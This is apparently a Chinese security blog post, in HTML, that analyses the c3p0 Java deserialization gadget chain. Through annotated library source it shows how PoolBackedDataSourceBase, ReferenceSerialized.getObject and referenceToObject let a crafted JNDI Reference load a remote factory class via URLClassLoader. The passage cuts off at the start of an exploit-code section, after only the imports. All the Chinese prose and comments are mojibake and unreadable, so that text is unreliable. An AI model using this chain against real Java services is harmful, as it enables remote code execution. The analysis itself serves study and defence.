NotSerializableExceptionï¼ˆå¦‚æœå®ƒä¸å¯åºåˆ—åŒ–ï¼‰</span></span><br><span class="line">        SerializableUtils.toByteArray(connectionPoolDataSource);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.1) è‹¥æœªæŠ›å¼‚å¸¸ï¼Œè¯´æ˜å®ƒæ˜¯å¯åºåˆ—åŒ–çš„ï¼Œç›´æ¥æŒ‰â€œæ™®é€šå¯¹è±¡â€å†™å…¥</span></span><br><span class="line">        oos.writeObject(connectionPoolDataSource);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotSerializableException nse) &#123;</span><br><span class="line">        <span class="comment">// 2.2) å¦åˆ™èµ°â€œé—´æ¥åºåˆ—åŒ–â€åˆ†æ”¯ï¼šæŠŠå¯¹è±¡åŒ…è£…æˆå¯å†™å½¢æ€ï¼ˆæºå¸¦ JNDI Referenceï¼‰</span></span><br><span class="line">        com.mchange.v2.log.MLog.getLogger(<span class="built_in">this</span>.getClass())</span><br><span class="line">            .log(com.mchange.v2.log.MLevel.FINE,</span><br><span class="line">                 <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, nse);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ReferenceIndirector ä¼šæŠŠå¯¹è±¡è½¬æˆå®ç°äº† IndirectlySerialized çš„åŒ…è£…ï¼Œ</span></span><br><span class="line">            <span class="comment">// å†…éƒ¨æºå¸¦ javax.naming.Referenceï¼ˆå«å·¥å‚ç±»åä¸ä½ç½®ï¼‰ï¼Œä»è€Œå¯å†™å…¥æµã€‚</span></span><br><span class="line">            <span class="type">Indirector</span> <span class="variable">indirector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mchange.v2.naming.ReferenceIndirector();</span><br><span class="line">            oos.writeObject(indirector.indirectForm(connectionPoolDataSource));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject</code> å‡½æ•°ä¸­ï¼Œé¦–å…ˆå…ˆè°ƒç”¨ <code>com.mchange.v2.ser.SerializableUtils#toByteArray</code> å‡½æ•°å°è¯•å¯¹ <code>connectionPoolDataSource</code> å­—æ®µè¿›è¡Œåºåˆ—åŒ–ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:343)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.serializeToByteArray(SerializableUtils.java:99)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.toByteArray(SerializableUtils.java:51)</span><br><span class="line">at com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.writeObject(PoolBackedDataSourceBase.java:161)</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœ <code>connectionPoolDataSource</code> å­—æ®µä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œåˆ™ä¼šæŠ›å‡º <code>NotSerializableException</code> å¼‚å¸¸è¢« <code>ObjectOutputStream#writeObject</code> åé¢çš„ <code>cache</code> æ•è·ã€‚</p>
<p>åœ¨ <code>cahce</code> éƒ¨åˆ†é¦–å…ˆå…ˆå®ä¾‹åŒ–ä¸€ä¸ª <code>com.mchange.v2.naming.ReferenceIndirector</code> å¯¹è±¡ï¼Œç„¶åè°ƒç”¨ <code>ReferenceIndirector#indirectForm</code> å¯¹ <code>connectionPoolDataSource</code> å­—æ®µè¿›è¡ŒåŒ…è£…ç„¶åå†åºåˆ—åŒ–ã€‚</p>
<p><code>indirectForm</code> å‡½æ•°è¿”å›äº†ä¸€ä¸ªå®ä¾‹åŒ–çš„ <code>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized</code> å¯¹è±¡ï¼Œè¿™æ˜¯ <code>ReferenceIndirector</code> çš„ä¸€ä¸ªç§æœ‰å†…éƒ¨ç±»ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†ä¸å¯ç›´æ¥åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆå¿…é¡»å®ç° Referenceableï¼‰åŒ…è£…æˆâ€œå¯é—´æ¥åºåˆ—åŒ–â€çš„å½¢æ€ã€‚</span></span><br><span class="line"><span class="comment">// è¿™é‡Œçš„è¿”å›ç±»å‹ IndirectlySerialized æ˜¯ä¸€ä¸ªâ€œå¯åºåˆ—åŒ–çš„æ ‡è®°æ¥å£â€ï¼ˆç»§æ‰¿ Serializableï¼‰ï¼Œ</span></span><br><span class="line"><span class="comment">// åŒ…è£…é‡Œæºå¸¦äº† JNDI çš„ Reference åŠå¯é€‰çš„ Name/Context/env å…ƒæ•°æ®ã€‚</span></span><br><span class="line"><span class="comment">// ä¹‹ååœ¨ readObject é˜¶æ®µï¼Œä¼šè°ƒç”¨åŒ…è£…çš„ getObject() å†æŠŠå®ƒâ€œè¿˜åŸâ€ä¸ºçœŸå®å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">(Object orig)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// ä»åŸå§‹å¯¹è±¡å–å‡º JNDI å¼•ç”¨ã€‚å‰æï¼šorig å®ç°äº† javax.naming.Referenceableã€‚</span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();</span><br><span class="line">    <span class="comment">// ç”¨ Reference + å…ƒæ•°æ® æ„é€ ä¸€ä¸ªå¯åºåˆ—åŒ–çš„åŒ…è£…ä½“è¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>(ref, name, contextName, environmentProperties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™ä¸ªå†…éƒ¨ç±»å°±æ˜¯â€œé—´æ¥åºåˆ—åŒ–â€çš„è½½ä½“ï¼šæŠŠ Reference ç­‰å¿…è¦ä¿¡æ¯æ‰“åŒ…è¿›æ¥ï¼Œ</span></span><br><span class="line"><span class="comment">// ä½¿å…¶æœ¬èº«å¯ä»¥è¢« ObjectOutputStream å†™å‡ºï¼›ååºåˆ—åŒ–åé€šè¿‡ getObject() è¿˜åŸã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReferenceSerialized</span> <span class="keyword">implements</span> <span class="title class_">IndirectlySerialized</span> &#123;</span><br><span class="line">    <span class="comment">// å¾…è¿˜åŸå¯¹è±¡çš„ JNDI å¼•ç”¨ï¼ˆåŒ…å«å·¥å‚ç±»å/ä½ç½®ä»¥åŠä¸€ç»„åœ°å€å±æ€§ï¼‰</span></span><br><span class="line">    Reference reference;</span><br><span class="line">    <span class="comment">// é€»è¾‘åï¼ˆå¯é€‰ï¼‰ã€‚åœ¨æŸäº›å·¥å‚è§£æåœºæ™¯ä¸­ç”¨äºæ ‡è¯†æ¡ç›®</span></span><br><span class="line">    Name name;</span><br><span class="line">    <span class="comment">// ä¸Šä¸‹æ–‡åï¼ˆå¯é€‰ï¼‰ã€‚å¦‚æœæä¾›ï¼Œä¼šå…ˆåœ¨åˆå§‹ä¸Šä¸‹æ–‡ä¸‹ lookup åˆ°è¿™ä¸ªå­ä¸Šä¸‹æ–‡ï¼Œå†åœ¨å…¶ä¸­è§£æå¼•ç”¨</span></span><br><span class="line">    Name contextName;</span><br><span class="line">    <span class="comment">// ç¯å¢ƒå±æ€§ï¼ˆå¯é€‰ï¼‰ï¼Œæ„é€  InitialContext æ—¶ä½¿ç”¨ï¼ˆç›¸å½“äº JNDI çš„ envï¼‰</span></span><br><span class="line">    Hashtable env;</span><br><span class="line"></span><br><span class="line">    ReferenceSerialized(Reference reference,</span><br><span class="line">                        Name name,</span><br><span class="line">                        Name contextName,</span><br><span class="line">                        Hashtable env) &#123;</span><br><span class="line">        <span class="built_in">this</span>.reference   = reference;</span><br><span class="line">        <span class="built_in">this</span>.name        = name;</span><br><span class="line">        <span class="built_in">this</span>.contextName = contextName;</span><br><span class="line">        <span class="built_in">this</span>.env         = env;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºå‰é¢å®ä¾‹åŒ– <code>ReferenceIndirector</code> è°ƒç”¨çš„æ˜¯å®ƒçš„æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤è¿™é‡Œå®ä¾‹åŒ– <code>ReferenceSerialized</code> æ—¶ä¼ å…¥çš„å…¶ä½™å‚æ•°éƒ½æ˜¯é»˜è®¤ç©ºå€¼ã€‚</p>
<p>å”¯ä¸€ä¸€ä¸ªä¸è¢«åŒ…è£…çš„ <code>connectionPoolDataSource</code> å¯¹è±¡ç›¸å…³çš„å‚æ•°æ˜¯ <code>ref</code>ï¼Œè¿™æ˜¯è°ƒç”¨ <code>connectionPoolDataSource</code> çš„ <code>getReference</code> æ–¹æ³•è·å–åˆ°çš„ï¼Œè¢«èµ‹å€¼ç»™ <code>ReferenceSerialized</code> çš„ <code>reference</code> å±æ€§ã€‚</p>
<h4 id="ååºåˆ—åŒ–è¿‡ç¨‹"><a href="#ååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="ååºåˆ—åŒ–è¿‡ç¨‹"></a>ååºåˆ—åŒ–è¿‡ç¨‹</h4><p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</code> åœ¨å®Œæˆ <code>connectionPoolDataSource</code> å­—æ®µååºåˆ—åŒ–åï¼Œä¼šåˆ¤æ–­è¯¥å­—æ®µæ˜¯å¦æ˜¯ <code>IndirectlySerialized</code> çš„å®ç°ç±»ã€‚å¦‚æœæ˜¯çš„è¯ä¼šè°ƒç”¨ <code>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized#getObject</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">short</span> <span class="variable">VERSION</span> <span class="operator">=</span> <span class="number">0x0001</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ååºåˆ—åŒ–é’©å­ï¼šå½“é€šè¿‡ ObjectInputStream è¯»å–è¯¥ç±»å®ä¾‹æ—¶ï¼Œä¼šèµ°åˆ°è¿™ä¸ªæ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">// éœ€è¦æŒ‰ä¸ writeObject å®Œå…¨ä¸€è‡´çš„é¡ºåºè¯»å–å„å­—æ®µï¼Œå¦åˆ™ä¼šæŠ›å‡ºæµæŸåå¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// è¯»å–è‡ªå®šä¹‰çš„åºåˆ—åŒ–ç‰ˆæœ¬å·ï¼Œç”¨äºå…¼å®¹ä¸åŒç‰ˆæœ¬çš„å­—æ®µå¸ƒå±€</span></span><br><span class="line">    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (version) &#123;</span><br><span class="line">        <span class="keyword">case</span> VERSION:</span><br><span class="line">            <span class="comment">// äººä¸ºåŠ ä¸€ä¸ªå°ä½œç”¨åŸŸï¼Œåªæ˜¯ä¸ºäº†åœ¨ä¸‹é¢å¤ç”¨åŒåä¸´æ—¶å˜é‡ oï¼ˆé¿å…å˜é‡åå†²çªï¼‰</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// è¯»å– connectionPoolDataSource å­—æ®µï¼Œ</span></span><br><span class="line">                <span class="comment">// ä¹Ÿå¯èƒ½æ˜¯â€œé—´æ¥åºåˆ—åŒ–(IndirectlySerialized)â€çš„åŒ…è£…ï¼‰</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// å¦‚æœè¯»å–åˆ°çš„æ˜¯é—´æ¥åºåˆ—åŒ–åŒ…è£…ï¼ˆä¾‹å¦‚ ReferenceIndirector.ReferenceSerializedï¼‰ï¼Œ</span></span><br><span class="line">                <span class="comment">// åˆ™é€šè¿‡ getObject() è¿˜åŸä¸ºçœŸæ­£çš„ç›®æ ‡å¯¹è±¡ã€‚</span></span><br><span class="line">                <span class="comment">// ã€å®‰å…¨æ³¨æ„ã€‘è¿™é‡Œçš„ getObject() å†…éƒ¨ä¼šè°ƒç”¨ ReferenceableUtils.referenceToObject(...)</span></span><br><span class="line">                <span class="comment">// å¯èƒ½æ ¹æ® factoryClassLocation ä½¿ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ç±»ï¼Œè¿™æ˜¯å¸¸è§åˆ©ç”¨ç‚¹ã€‚</span></span><br><span class="line">                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// å°†è¿˜åŸåçš„å¯¹è±¡å¼ºè½¬å¹¶èµ‹ç»™æˆå‘˜å­—æ®µ</span></span><br><span class="line">                <span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºå‰é¢åºåˆ—åŒ–é˜¶æ®µå› ä¸º <code>connectionPoolDataSource</code> ä¸å¯åºåˆ—åŒ–è€Œç»è¿‡äº† <code>ReferenceSerialized</code> çš„åŒ…è£…ï¼Œå› æ­¤è¿™é‡Œæ»¡è¶³æ˜¯ <code>IndirectlySerialized</code> çš„å®ç°ç±»çš„æ¡ä»¶ï¼Œå› æ­¤ä¼šè°ƒç”¨ <code>ReferenceSerialized#getObject</code> å‡½æ•°è·å–å®é™…çš„ <code>connectionPoolDataSource</code> å­—æ®µã€‚</p>
<p><code>ReferenceSerialized#getObject</code> å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ååºåˆ—åŒ–ä¹‹åçš„â€œå¤åŸâ€å…¥å£ï¼šæŠŠ Reference è§£ææˆçœŸå®å¯¹è±¡å¹¶è¿”å›</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) æ„é€ åˆå§‹ä¸Šä¸‹æ–‡ï¼ˆå¸¦æˆ–ä¸å¸¦ç¯å¢ƒå±æ€§ï¼‰</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> (env == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">InitialContext</span>()</span><br><span class="line">                                               : <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) å¦‚æœæŒ‡å®šäº† contextNameï¼Œåˆ™å…ˆåœ¨åˆå§‹ä¸Šä¸‹æ–‡ä¸‹ lookup åˆ°è¯¥å­ä¸Šä¸‹æ–‡</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">nameContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (contextName != <span class="literal">null</span>)</span><br><span class="line">            nameContext = (Context) initialContext.lookup(contextName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) æ ¸å¿ƒï¼šæŠŠ Reference è§£æä¸ºå…·ä½“å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// ReferenceableUtils.referenceToObject(...) å†…éƒ¨ä¼šï¼š</span></span><br><span class="line">        <span class="comment">//   - è¯»å– reference çš„ factoryClassName / factoryClassLocation</span></span><br><span class="line">        <span class="comment">//   - å¦‚æœ‰ factoryClassLocationï¼Œåˆ™ä½¿ç”¨ URLClassLoader(æ”¯æŒ http/https/jar/file ç­‰) åŠ è½½å·¥å‚ç±»</span></span><br><span class="line">        <span class="comment">//   - å®ä¾‹åŒ–ä¸º javax.naming.spi.ObjectFactoryï¼Œå¹¶è°ƒç”¨ getObjectInstance(...) å¾—åˆ°ç›®æ ‡å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// è¿™ä¸€æ­¥ä¹Ÿæ˜¯å¸¸è§çš„å¯æ‰§è¡Œç‚¹ï¼šè‹¥å·¥å‚ç±»åˆå§‹åŒ–æˆ– getObjectInstance å«æœ‰å‰¯ä½œç”¨ï¼Œå°†åœ¨æ­¤è§¦å‘ã€‚</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceableUtils.referenceToObject(reference, name, nameContext, env);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºå‰é¢ <code>ReferenceIndirector#indirectForm</code> å®ä¾‹åŒ– <code>ReferenceSerialized</code> çš„æ—¶å€™åªæœ‰ <code>reference</code>  æ˜¯éç©ºçš„ï¼Œå› æ­¤è¿™é‡Œä¼šè°ƒç”¨ <code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject</code> å‡½æ•°è·å–çœŸæ­£çš„å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°† JNDI Reference è§£æä¸ºçœŸå®å¯¹è±¡ï¼šæŒ‰ Reference ä¸­çš„å·¥å‚ç±»å/ä½ç½®åŠ è½½ ObjectFactoryï¼Œå¹¶è°ƒç”¨å…¶ getObjectInstance(...)ã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">(Reference ref, Name name, Context nameCtx, Hashtable env)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ä» Reference ä¸­å–å‡ºâ€œå·¥å‚ç±»åâ€å’Œâ€œå·¥å‚ç±»ä»£ç ä½ç½®â€ï¼ˆå¯ä¸ºç©ºï¼‰</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fClassName</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¼˜å…ˆä½¿ç”¨å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆTCCLï¼‰ï¼›è‹¥ä¸º nullï¼Œåˆ™é€€å›åˆ°æœ¬å·¥å…·ç±»çš„ç±»åŠ è½½å™¨</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">defaultClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (defaultClassLoader == <span class="literal">null</span>) defaultClassLoader = ReferenceableUtils.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">        ClassLoader cl;</span><br><span class="line">        <span class="keyword">if</span> (fClassLocation == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æœªæŒ‡å®šè¿œç¨‹ä½ç½® â†’ ä½¿ç”¨é»˜è®¤ç±»åŠ è½½å™¨ï¼ˆåªåœ¨æœ¬åœ°ç±»è·¯å¾„æŸ¥æ‰¾ï¼‰</span></span><br><span class="line">            cl = defaultClassLoader;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æŒ‡å®šäº†å·¥å‚ç±»ä½ç½® â†’ åˆ›å»º URLClassLoaderï¼ˆçˆ¶ä¸ºé»˜è®¤ CLï¼‰</span></span><br><span class="line">            <span class="comment">// ã€å®‰å…¨æç¤ºã€‘è¿™é‡Œå¯æ¥å— http/https/file/jar ç­‰ URLï¼Œæ„å‘³ç€å¯ä»¥è¿›è¡Œè¿œç¨‹ä»£ç åŠ è½½</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(fClassLocation);</span><br><span class="line">            cl = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;u&#125;, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŒ‰ç»™å®šç±»åŠ è½½å™¨åŠ è½½å·¥å‚ç±»ï¼›ç¬¬äºŒä¸ªå‚æ•° true è¡¨ç¤ºâ€œåˆå§‹åŒ–ç±»â€ï¼Œä¼šè§¦å‘ &lt;clinit&gt;ï¼ˆé™æ€ä»£ç å—ï¼‰</span></span><br><span class="line">        <span class="comment">// ã€è¦ç‚¹ã€‘å¦‚æœå·¥å‚ç±»çš„é™æ€åˆå§‹åŒ–æœ‰å‰¯ä½œç”¨ï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œæ­¤å¤„å°±ä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">fClass</span> <span class="operator">=</span> Class.forName(fClassName, <span class="literal">true</span>, cl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åå°„æ„é€ å·¥å‚å®ä¾‹ï¼›è¦æ±‚æœ‰æ— å‚æ„é€ ä¸”å®ç° javax.naming.spi.ObjectFactory</span></span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">of</span> <span class="operator">=</span> (ObjectFactory) fClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨å·¥å‚çš„ getObjectInstanceï¼Œæ ¹æ® Reference è¿˜åŸå‡ºç›®æ ‡å¯¹è±¡ï¼ˆæˆ–æ‰§è¡Œå·¥å‚è‡ªå®šä¹‰é€»è¾‘ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> of.getObjectInstance(ref, name, nameCtx, env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>referenceToObject</code> å‡½æ•°ä¼šåœ¨ <code>Reference</code> å¯¹è±¡è®¾ç½®äº† <code>classFactoryLocation</code> çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>URLClassLoader</code> è¿œç¨‹åŠ è½½ç±»å¹¶è°ƒç”¨æ— å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–ï¼Œè¿™å°±å®ç°äº†è¿œç¨‹ç±»åŠ è½½ã€‚</p>
<h3 id="åˆ©ç”¨ä»£ç -2"><a href="#åˆ©ç”¨ä»£ç -2" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">PoolSource</span> <span class="keyword">implements</span> 